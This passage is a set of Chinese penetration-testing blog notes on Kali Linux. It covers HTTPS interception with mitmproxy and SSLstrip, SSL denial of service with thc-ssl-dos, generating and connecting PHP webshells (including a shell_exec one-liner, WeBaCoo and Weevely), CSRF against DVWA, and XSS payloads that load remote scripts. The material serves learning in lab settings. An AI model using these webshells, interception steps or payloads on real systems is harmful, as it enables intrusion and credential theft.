src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206121234985.png" alt="image-20230206121234985"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206121317062.png" alt="image-20230206121317062"></p><h4 id="受害机访问https网站"><a href="#受害机访问https网站" class="headerlink" title="受害机访问https网站"></a>受害机访问https网站</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206121734004.png" alt="image-20230206121734004"></p><blockquote><p>win7默认集成的根证书无法验证伪造证书，导致浏览器告警提示</p></blockquote><ul><li>右键—&gt;属性—&gt;证书</li></ul><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206125544154.png" alt="image-20230206125544154"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206130132299.png" alt="image-20230206130132299"></p><blockquote><p>其中若是客户端进行登录操作，就会被攻击主机截获到用户名和密码</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206130731328.png" alt="image-20230206130731328"></p><blockquote><p>百度登录信息在攻击机可以被查看到</p><p>类似百度、淘宝这样的网站，仅仅用https中间人解密并不足以看到最终的明文密码，但是https是可以解密的，用中间人攻击是成功的。</p></blockquote><h3 id="Mitmproxy"><a href="#Mitmproxy" class="headerlink" title="Mitmproxy"></a>Mitmproxy</h3><blockquote><p>此工具只能侦听8080端口</p></blockquote><ul><li><code>mitmproxy -T --host -w mitmproxy.log</code></li></ul><blockquote><p>–mode transparent：启动命令</p><p>-w：流量写入mitmproxy.log日志文件</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206133608730.png" alt="image-20230206133608730"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206133641942.png" alt="image-20230206133641942"></p><blockquote><p>中间人代理流量都会在此窗口记录</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206135208440.png" alt="image-20230206135208440"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206135221370.png" alt="image-20230206135221370"></p><blockquote><p>按q可退出</p></blockquote><h3 id="SSLstrip"><a href="#SSLstrip" class="headerlink" title="SSLstrip"></a>SSLstrip</h3><blockquote><ul><li>与前两种工具不同，将客户端到中间人之间的流量变为明文，中间人再使用https传输与服务器端进行加密请求</li><li>ssltrip -l 8080</li></ul></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206135520058.png" alt="image-20230206135520058"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206142931512.png" alt="image-20230206142931512"></p><blockquote><p>工具的使用都差不多，前提都是需要进行Arp地址欺骗，配置iptables端口转发规则，再利用工具进行截获https流量</p></blockquote><h2 id="SSL-x2F-TLS拒绝服务攻击"><a href="#SSL-x2F-TLS拒绝服务攻击" class="headerlink" title="SSL&#x2F;TLS拒绝服务攻击"></a>SSL&#x2F;TLS拒绝服务攻击</h2><blockquote><ul><li>thc-ssl-doc<ul><li>SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</li><li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li><li>与流量式拒绝服务攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器</li><li>服务器平均可以处理300次&#x2F;秒SSL握手请求</li><li>对SMTPS、POP3S等服务同样有效</li></ul></li><li>防御<ul><li>禁用SSL-Renegotiation、使用SSL Accelerator</li><li>通过修改thc-ssl-dos代码，可以绕过以上对策</li></ul></li></ul></blockquote><h2 id="thc-ssl-dos"><a href="#thc-ssl-dos" class="headerlink" title="thc-ssl-dos"></a>thc-ssl-dos</h2><ul><li><code>thc-ssl-dos -l 500 x.x.x.x 443 --accept</code></li></ul><blockquote><p>-l：限制并发连接</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206200714763.png" alt="image-20230206200714763"></p>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> HTTPS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-webshell</title>
      <link href="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/"/>
      <url>/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><blockquote><ul><li>一句话<ul><li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></li></ul></li><li>可能被IDS、AV、WAF、扫描器软件发现查杀</li><li>大马<ul><li>php、asp、jsp等功能特别多的webshell</li></ul></li></ul></blockquote><h2 id="WeBaCoo"><a href="#WeBaCoo" class="headerlink" title="WeBaCoo"></a>WeBaCoo</h2><blockquote><ul><li>Web Backdoor Cookie</li><li>类终端的shell（只针对php）</li><li>编码通信内容通过cookie头传输，隐蔽性较强<ul><li>cm：base64编码的命令</li><li>cn：服务器用于返回数据的cookie头的名</li><li>cp：返回信息定界符</li></ul></li><li>生成服务端<ul><li><code>webacoo -g -o a.php</code></li></ul></li><li>客户端连接<ul><li><code>webacoo -t -u http://1.1.1.1/a.php</code></li></ul></li></ul></blockquote><h3 id="生成服务端"><a href="#生成服务端" class="headerlink" title="生成服务端"></a>生成服务端</h3><ul><li>webacoo -g -o a.php</li></ul><blockquote><p>-g：表示生成服务器端</p><p>-o：生成的服务端要输出为一个文件</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205173131727.png" alt="image-20230205173131727"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205173559561.png" alt="image-20230205173559561"></p><blockquote><p>其中的后门程序都被加密，用于绕过服务器端的防护</p></blockquote><h3 id="上传a-php文件"><a href="#上传a-php文件" class="headerlink" title="上传a.php文件"></a>上传a.php文件</h3><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205173927266.png" alt="image-20230205173927266"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205174105220.png" alt="image-20230205174105220"></p><blockquote><p>在正常情况下webshell通过文件上传或通过漏洞写入web网站目录中</p></blockquote><h3 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h3><ul><li><code>webacoo -t -u http://1.1.1.1/a.php</code></li></ul><blockquote><p>-t：远程终端连接</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205174435029.png" alt="image-20230205174435029"></p><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205174738404.png" alt="image-20230205174738404"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205175301171.png" alt="image-20230205175301171"></p><blockquote><p>Cookie后面经过base64编码之后的发送的指令：cat &#x2F;etc&#x2F;passwd；cn表示返回信息使用的cookie名；cp：返回数据的起始定界符，服务端cookie中<code>BLy~</code>定界符，从此定界符开始往后都是返回的内容就是passwd文件中的数据</p></blockquote><h2 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h2><blockquote><ul><li>隐蔽的类终端PHP Webshell（只针对php）</li><li>30多个管理模块<ul><li>执行系统命令、浏览文件系统</li><li>检查服务器常见配置错误</li><li>创建正向、反向TCP Shell连接</li><li>通过目标计算机代理 HTTP 流量</li><li>从目标计算机运行端口扫描，渗透内网</li></ul></li><li>支持连接密码</li></ul></blockquote><h3 id="生成服务端-1"><a href="#生成服务端-1" class="headerlink" title="生成服务端"></a>生成服务端</h3><ul><li><code>weevely generate pass123  wee.php</code></li></ul><blockquote><p>generate：生成后门文件，<strong>后面必须加上连接密码</strong></p><p>pass123：连接密码</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205180659789.png" alt="image-20230205180659789"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205180937896.png" alt="image-20230205180937896"></p><h3 id="上传后门文件"><a href="#上传后门文件" class="headerlink" title="上传后门文件"></a>上传后门文件</h3><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205180918628.png" alt="image-20230205180918628"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205181004820.png" alt="image-20230205181004820"></p><h3 id="客户端连接-1"><a href="#客户端连接-1" class="headerlink" title="客户端连接"></a>客户端连接</h3><ul><li><code>weevely http://192.168.216.167/dvwa/hackable/uploads/wee.php pass123</code></li></ul><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205181128249.png" alt="image-20230205181128249"></p><h3 id="抓包分析-1"><a href="#抓包分析-1" class="headerlink" title="抓包分析"></a>抓包分析</h3><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205181315419.png" alt="image-20230205181315419"></p><blockquote><p>其中有些数据都是通过加密，最下面一行也是通过base64编码内容</p></blockquote><h3 id="weevely—Model"><a href="#weevely—Model" class="headerlink" title="weevely—Model"></a>weevely—Model</h3><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205210034071.png" alt="image-20230205210034071"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205210050458.png" alt="image-20230205210050458"></p><h4 id="审计suid和sgid"><a href="#审计suid和sgid" class="headerlink" title="审计suid和sgid"></a>审计suid和sgid</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-webshell/image-20230205210303021.png" alt="image-20230205210303021"></p><blockquote><p>其中有些模块执行需要加上<code>/</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-Web渗透【CSRF】</title>
      <link href="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/"/>
      <url>/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h2><blockquote><ul><li>Cross-site request forgery（跨站请求伪造）</li><li>从信任的角度区分<ul><li>XSS：利用用户对站点的信任</li><li>CSRF：利用站点对已经身份认证的信任</li></ul></li><li>结合社工在身份认证会话过程中实现攻击<ul><li>修改账号密码、个人信息（email、收货地址）</li><li>发送伪造的业务请求（网银、购物、投票）</li><li>关注他人社交账号、推送博文</li><li><strong>在用户非自愿、不知情的情况下提交请求</strong></li></ul></li><li>业务逻辑漏洞<ul><li>对关键操作缺少确认机制</li><li>自动扫描程序无法发现此类漏洞</li></ul></li><li>漏洞利用条件<ul><li>被害用户已经完成身份认证</li><li>新请求的提交不需要重新身份认证或确认机制</li><li>攻击者必须了解Web APP请求的参数构造</li><li>诱使用户触发攻击的指令（社工）</li></ul></li><li>Burpsuite CSRF PoC generator <ul><li>Post &#x2F; Get方法</li></ul></li><li>自动扫描程序的检测方法<ul><li>在请求和响应过程中检查是否存在 anti-CSRF token  名</li><li>检查服务器是否存在验证 anti-CSRF token 的名值</li><li>检查token中可编辑的字符串</li><li>检查referer头是否可以伪造</li></ul></li><li>防御<ul><li>Captcha</li><li>anti-CSRF token</li><li>Referer头</li><li>降低会话超时时间</li></ul></li></ul></blockquote><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><blockquote><p>客户端向服务器提交了合法的身份认证请求后，此时在服务器端看来客户端就是合法用户，服务端是信任客户端的，原本服务端不允许客户端访问的资源经过合法请求后现在允许客户端进行访问；此时若有一个Hacker向客户端发送一个定制的请求（页面 &#x2F; 按钮 &#x2F; 链接等），这个请求一旦在客户端被访问后，最终请求的内容是向已经经过身份认证的服务器端发送请求，例如这个请求是用来修改帐号密码，而服务器端对这种请求没有做确认，没有做二次验证，没有采取随机数机制来防止这种操作的误触发的话，那么此时web存在CSRF漏洞；<strong>此漏洞的根源在于服务端对关键操作缺少确认机制。</strong></p></blockquote><h2 id="CSRF漏洞利用"><a href="#CSRF漏洞利用" class="headerlink" title="CSRF漏洞利用"></a>CSRF漏洞利用</h2><h3 id="Get方法"><a href="#Get方法" class="headerlink" title="Get方法"></a>Get方法</h3><h4 id="修改密码抓包"><a href="#修改密码抓包" class="headerlink" title="修改密码抓包"></a>修改密码抓包</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205112716533.png" alt="image-20230205112716533"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205112728097.png" alt="image-20230205112728097"></p><blockquote><p>可以看到修改密码没有任何确认机制，典型的CSRF</p></blockquote><h4 id="复制URL伪造页面"><a href="#复制URL伪造页面" class="headerlink" title="复制URL伪造页面"></a>复制URL伪造页面</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205113545150.png" alt="image-20230205113545150"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205113735515.png" alt="image-20230205113735515"></p><h4 id="win7模拟客户端"><a href="#win7模拟客户端" class="headerlink" title="win7模拟客户端"></a>win7模拟客户端</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205114318732.png" alt="image-20230205114318732"></p><blockquote><p>web客户端正常在此页面工作，突然在此页面收到一封邮件，邮件中链接就是上述页面（假如页面内容是很诱惑人的）</p></blockquote><h4 id="点击页面中的链接"><a href="#点击页面中的链接" class="headerlink" title="点击页面中的链接"></a>点击页面中的链接</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205114922970.png" alt="image-20230205114922970"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205114908875.png" alt="image-20230205114908875"></p><blockquote><p>此时密码已经被修改</p></blockquote><h4 id="客户端尝试登录"><a href="#客户端尝试登录" class="headerlink" title="客户端尝试登录"></a>客户端尝试登录</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205115231909.png" alt="image-20230205115231909"></p><blockquote><p>此时客户端使用原来的<code>admin:password</code>已经无法登录</p></blockquote><h4 id="攻击者登录"><a href="#攻击者登录" class="headerlink" title="攻击者登录"></a>攻击者登录</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205115345779.png" alt="image-20230205115345779"></p><blockquote><p>此时攻击者不知道客户端是否已经点击恶意链接，等了很久差不多之后尝试使用新修改的密码登录<code>admin:123</code>是可以登录成功的</p></blockquote><h3 id="Post方法"><a href="#Post方法" class="headerlink" title="Post方法"></a>Post方法</h3><h4 id="利用BurpSuit生成CSRF的PoC"><a href="#利用BurpSuit生成CSRF的PoC" class="headerlink" title="利用BurpSuit生成CSRF的PoC"></a>利用BurpSuit生成CSRF的PoC</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205120555894.png" alt="image-20230205120555894"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205120622276.png" alt="image-20230205120622276"></p><h4 id="复制PoC"><a href="#复制PoC" class="headerlink" title="复制PoC"></a>复制PoC</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205120750378.png" alt="image-20230205120750378"></p><h4 id="客户端漏洞利用"><a href="#客户端漏洞利用" class="headerlink" title="客户端漏洞利用"></a>客户端漏洞利用</h4><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205120838525.png" alt="image-20230205120838525"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205120917048.png" alt="image-20230205120917048"></p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><h5 id="low"><a href="#low" class="headerlink" title="low"></a>low</h5><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205122058401.png" alt="image-20230205122058401"></p><blockquote><p>低安全级别没有确认机制，直接就可以被漏洞利用</p></blockquote><h5 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h5><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205122210741.png" alt="image-20230205122210741"></p><blockquote><p>中安全级别添加了<code>HTTP_REFERER</code>字段，会判断来源地址中是否包含127.0.0.1，不包含的话就不会被成功利用CSRF漏洞；但可以在截断代理中修改Referer字段为127.0.0.1达到绕过的目的，也可以成功进行漏洞利用</p></blockquote><h5 id="high"><a href="#high" class="headerlink" title="high"></a>high</h5><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90CSRF%E3%80%91/image-20230205122509544.png" alt="image-20230205122509544"></p><blockquote><p>高安全级别会确认当前密码，若当前密码输入不正确，也不能成功修改密码；攻击者若不知道受害者的密码则不能够利用此漏洞</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文看懂XSS</title>
      <link href="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/"/>
      <url>/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x01、XSS的原理和分类"><a href="#0x01、XSS的原理和分类" class="headerlink" title="0x01、XSS的原理和分类"></a>0x01、XSS的原理和分类</h2><p>跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets，CSS)的缩写混淆</p><p>故将跨站脚本攻击缩写为XSS，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的，XSS攻击针对的是用户层面的攻击；</p><p>XSS分为：存储型，反射型，DOM型XSS</p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640.jpeg" alt="图片"></p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675476372624-3.jpeg" alt="图片"></p><p>存储型XSS：存储型XSS，持久化，代码是存储在服务器中，如在个人信息或发表文章等地方，插入代码，如果没有过滤或者过滤不严，那么这些代码将储存到数据库中，用户访问该页面的时候出发代码执行，这种XSS比较危险，容易造成蠕虫，盗取Cookie；</p><p>反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码(服务器中没有这样的页面和内容)，一般容易出现在搜索页面，反射性XSS大多数是用来盗取用户的Cookie信息；</p><p>DOM型XSS:不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Object Model ,DOM)的一种漏洞，DOM-XSS是用过url传入参数取控制触发的，其实也属于反射型XSS，DOM的详解：DOM文档对象模型；</p><p>可能触发DOM型XSS的属性</p><ul><li>document.referer</li><li>window.name</li><li>location</li><li>innerHTML</li><li>documen.write</li></ul><h2 id="0x02、XSS攻击的危害"><a href="#0x02、XSS攻击的危害" class="headerlink" title="0x02、XSS攻击的危害"></a>0x02、XSS攻击的危害</h2><p>1、盗取各类用户账号，如机器登陆账号，用户网银账号，各类管理员账号；</p><p>2、控制企业数据，包括读取，篡改，添加，删除企业敏感数据的能力；</p><p>3、盗取企业重要的具有商业价值的资料；</p><p>4、非法转账；</p><p>5、强制发送电子邮件；</p><p>6、网站挂马；</p><p>7、控制受害者机器向其他网站发起攻击；</p><h2 id="0x03、XSS的测试语句"><a href="#0x03、XSS的测试语句" class="headerlink" title="0x03、XSS的测试语句"></a>0x03、XSS的测试语句</h2><p>在网站是否存在XSS漏洞时，应该输入一些标签，如&lt;，&gt;输入后查看网页源代码是否过滤标签，如果没有过滤，很大可能存在XSS漏洞。</p><p>常用测试语句：</p><p><code>&lt;h5&gt;1&lt;/h5&gt;</code></p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675476470809-6.jpeg" alt="图片"></p><p><code>&lt;span&gt;1&lt;/span&gt;</code></p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675476496186-9.jpeg" alt="图片"></p><p>可以看到，网站并没有对标签进行过滤；</p><p><code>&lt;script&gt;console.log(1)&lt;/script&gt;</code></p><p><img src="/2023/02/04/%E4%B8%80%E6%96%87%E7%9C%8B%E6%87%82XSS/640-1675476576393-12.jpeg" alt="图片"></p><p>可以看到，并没有弹出，但是控制台上输出了1，我们可以确定，确实存在XSS；</p><p>闭合问题：很多时候，在测试XSS的时候，想要要考虑到闭合问题，我们首先查看网页的源代码，需要首先判断出来，网站用的时单引号闭合还是双引号闭合；</p><p><code>&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;&quot;</code></p><p><code>&#39;&gt;&lt;span&gt;x&lt;/span&gt;&lt;&#39;</code></p><p>单行注释：</p><p><code>&quot;&gt;&lt;span&gt;x&lt;/span&gt;//</code>  # 双斜杠表示注释掉后面的语句</p><h2 id="0x04、XSS攻击语句"><a href="#0x04、XSS攻击语句" class="headerlink" title="0x04、XSS攻击语句"></a>0x04、XSS攻击语句</h2><p>输入检测确定标签没有过滤，为了显示漏洞存在，需要插入XSS攻击代码；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>svg onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">'javascript:alert(1)'</span><span class="token operator">></span>aa<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>普通的 <span class="token constant">XSS</span> JavaScript 注入<span class="token operator">&lt;</span><span class="token constant">SCRIPT</span> <span class="token constant">SRC</span><span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>3w<span class="token punctuation">.</span>org<span class="token operator">/</span><span class="token constant">XSS</span><span class="token operator">/</span>xss<span class="token punctuation">.</span>js<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token constant">SCRIPT</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token constant">IMG</span> 标签 <span class="token constant">XSS</span> 使用 JavaScript 命令<span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>3w<span class="token punctuation">.</span>org<span class="token operator">/</span><span class="token constant">XSS</span><span class="token operator">/</span>xss<span class="token punctuation">.</span>js<span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token constant">IMG</span> 标签无分号无引号<span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token constant">IMG</span> 标签大小写不敏感<span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span>JaVaScRiPt<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token constant">HTML</span> <span class="token function">编码</span><span class="token punctuation">(</span>必须有分号<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>修正缺陷 <span class="token constant">IMG</span> 标签<span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token string">""</span><span class="token string">">&lt;SCRIPT>alert("</span><span class="token constant">XSS</span><span class="token string">")&lt;/SCRIPT>"</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>formCharCode <span class="token function">标签</span><span class="token punctuation">(</span>计算器<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token constant">IMG</span> <span class="token constant">SRC</span><span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span 